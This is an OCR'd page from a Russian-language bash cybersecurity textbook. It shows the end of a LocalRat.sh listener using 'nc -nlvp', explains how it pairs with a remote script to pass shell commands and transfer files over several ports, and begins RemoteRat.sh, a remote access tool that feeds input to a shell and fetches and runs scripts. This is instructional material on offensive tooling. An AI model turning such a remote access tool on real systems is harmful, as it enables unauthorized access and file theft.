---
source_image: page_239.png
page_number: 239
model: model-run-olm-ocr
prompt_type: olmocr_technical
processing_time: 9.10
tokens: 7422
characters: 1592
timestamp: 2025-12-23T23:10:51.904771
finish_reason: stop
---

# инициируем демон фоновой передачи файлов
bgfilexfer &

# прослушиваем входящее соединение
nc -nlvp $HOMEPORT

Сценарий LocalRat.sh является пассивной или реагирующей на события стороной пары сценариев — он ожидает ответа от сценария RemoteRat.sh, а затем реагирует на них. Сценарии должны общаться через одни и те же порты, поэтому номера, указанные в командной строке, в этих сценариях должны совпадать.

Что же делает сценарий LocalRat.sh? Вот некоторые ключевые моменты.

① Сценарий начинается с запуска в фоновом режиме демона передачи файлов.

② Здесь сценарий ожидает входящее соединение от удаленного скрипта. Использование команды nc имеет ключевое значение, потому что сетевой файловый дескриптор bash (/dev/tcp) не может самостоятельно создать TCP-соединение.

③ Наша функция передачи файлов также начинается с прослушивания, но слушается второй номер порта. Нам нужно получить от этого сокета имя файла.

④ Еще одно обращение к nc — на этот раз для отправки файла, запрошенного в предыдущем сообщении. Это сетевая команда cat — вопрос предоставления файла в качестве ввода для команды, подключенной к порту номер три.

Сценарий в примере 16.2 устанавливает TCP-соединение с удаленной (целевой) системой.

Пример 16.2. RemoteRat.sh

#!/bin/bash -
#
# Bash и кибербезопасность
# RemoteRat.sh
#
# Описание:
# Инструмент удаленного доступа для запуска в удаленной системе;
# в основном передает любые входные данные в оболочку,
# но если указан !, извлекает и запускает сценарий
#
# Использование: RemoteRat.sh hostname port1 [port2 [port3]]

function cleanup ()
{
    rm -f $TMPFL
}